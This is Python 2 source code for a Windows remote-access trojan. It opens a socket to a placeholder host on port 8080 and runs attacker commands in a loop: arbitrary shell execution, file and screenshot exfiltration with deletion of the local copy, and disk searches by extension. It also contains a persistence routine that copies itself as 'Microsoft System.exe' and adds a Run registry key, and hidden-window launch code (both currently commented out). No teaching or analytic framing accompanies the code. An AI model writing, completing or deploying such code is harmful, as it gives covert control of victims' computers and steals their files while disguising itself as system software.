import os
import socket
from time import sleep

from PIL import ImageGrab
import subprocess
import tempfile
import shutil
import _winreg as wreg

def transfer(s,path):
    if path == 'screencap':
        tmp = tempfile.mkdtmp()
        path = '{}/image.jpeg'.format(tmp)
        ImageGrab.grab().save(path, "JPEG")


    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet) 
            packet = f.read(1024)
        s.send('DONE')
        os.remove(path)
        f.close()
        
    else:
        s.send('Unable to find the file')

def persist():
    thispath = os.getcwd().strip('\n')
    Null,userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')
    dest = userprof.strip('\r\n') + '\\Documents\\' + 'Microsoft System.exe'

    if not os.path.exists(dest):
        shutil.copyfile(thispath+'\Microsoft System.exe', dest)

        #C:\Users\USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
        key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",0,wreg.KEY_ALL_ACESS)
        wreg.SetValueEx(key, 'ReqOpdater', 0, wreg.REG_SZ, dest)
        key.Close()
        
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ip = socket.gethostbyname( ' HOST' ) #-------------------------------------------------------------------------------------
    s.connect((ip, 8080))

 #   persist()
 
    while True: 
        command = s.recv(2048)
        
        if 'terminate' in command:
            s.close()
            return 1

        if 'cd' in command:
            cd, dir = command.split(" ")
            os.chdir(dir)
            s.send('[+] {} is the current working directory.'.format(dir))

        elif 'grab' in command:            
            grab,path = command.split('*')
            try:
                transfer(s,path)
            except Exception,e:
                s.send (str(e))
                pass

        elif 'screenshot' in command:
            transfer(s,'screencap')

        elif 'search' in command: # search C:\\*.pdf
            command = command[7:]
            path,ext = command.split("*")

            list = ""
            for dirpath,dirs,files in os.walk(path): #dirpath = path, dirs = all the dirs and sub dirs, files = list of all files
                for file in files:
                    if file.endswith(ext):
                        list += '\n' + os.path.join(dirpath, file)
            s.send(list)
            s.send('|:|')

        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            out = CMD.stdout.read()
            err = CMD.stderr.read()
            if out != "" or err != "":
                s.send(out)
                s.send(err)
            else:
                s.send("no reply")

#def startProgram():
#    SW_HIDE = 0
#    info = subprocess.STARTUPINFO()
#    info.dwFlags = subprocess.STARTF_USESHOWWINDOW
#    info.wShowWindow = SW_HIDE
#    subprocess.Popen(r'C:\test.exe', startupinfo=info)

def main ():
#    startProgram()
    while True:
        try:
            if connect() == 1:
                break;
        except:
            sleep(30)
            pass
main()











